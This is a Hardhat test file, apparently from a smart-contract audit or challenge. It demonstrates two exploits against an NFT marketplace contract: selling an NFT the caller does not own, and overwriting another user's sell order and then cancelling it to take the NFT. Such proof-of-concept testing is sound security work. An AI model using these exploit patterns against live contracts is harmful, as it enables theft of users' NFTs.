const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[NFTMarketplace] Exploits', function() {
	let deployer, governance, users, attacker;

	beforeEach(async function() {
		[deployer, governance, alice, bob, charlie, attacker] = await ethers.getSigners();
		users = [alice, bob, charlie];

		this.token = await (await ethers.getContractFactory('ApeCoin', deployer)).deploy();
		this.nfts = await (await ethers.getContractFactory('HalbornNFT', deployer)).deploy();
		this.marketplace = await (await ethers.getContractFactory('NFTMarketplace', deployer)).deploy(governance.address, this.token.address, this.nfts.address);

		for (let i = 0; i < users.length; ++i){
			await (await this.token.connect(users[i])).approve(this.marketplace.address, ethers.constants.MaxUint256); // Set maximum allowance for transferring ApeCoin
			await (await this.nfts.connect(users[i])).setApprovalForAll(this.marketplace.address, true); // Allow marketplace to transfer NFTs from its users
			await this.nfts.safeMint(users[i].address, i); // Mint NFT #0 for Alice, #1 for Bob and #2 for Charlie
			expect(
				await this.nfts.ownerOf(i)
			).to.be.equal(users[i].address);
		}

		this.attackerInstance = await this.marketplace.connect(attacker);
	});

	it('[postSellOrder] No validation that the poster of the sell order is the owner of the NFT', async function() {
		let nftId = 0;

		this.token.mint(attacker.address, 1); // Give only 1 token to attacker
		expect(
			await this.token.balanceOf(attacker.address)
		).to.be.equal(1);

		expect(
			await this.nfts.ownerOf(nftId)
		).to.be.equal(alice.address); // Make sure owner of NFT is Alice before the attack 

		await this.attackerInstance.postSellOrder(nftId, 1); // Post sell order for Alice's NFT for 1 token
		await (await this.token.connect(attacker)).approve(this.marketplace.address, 1); // Set marketplace allowance for spending attacker's token
		await this.attackerInstance.buySellOrder(nftId); // Buy Alice's NFT for 1 token

		expect(
			await this.nfts.ownerOf(nftId)
		).to.be.equal(attacker.address); // Attacker is now the owner of the NFT for only 1 token !
	});

	it('[cancelSellOrder] Overwriting of a sell order leads to exfiltration of the NFT', async function() {
		let nftId = 0;
		let sellAmount = 1000;

		await (await this.marketplace.connect(alice)).postSellOrder(nftId, sellAmount);
		expect(
			await this.marketplace.viewCurrentSellOrder(nftId)
		).to.eql([alice.address, ethers.BigNumber.from(sellAmount)]); // Check that the sell order is posted from Alice

		await this.attackerInstance.postSellOrder(nftId, 1); // Overwrite sell order
		await this.attackerInstance.cancelSellOrder(nftId); // Get back NFT collateral from marketplace

		expect(
			await this.nfts.ownerOf(nftId)
		).to.be.equal(attacker.address); // Attacker is now the owner of the NFT for free !
	});
});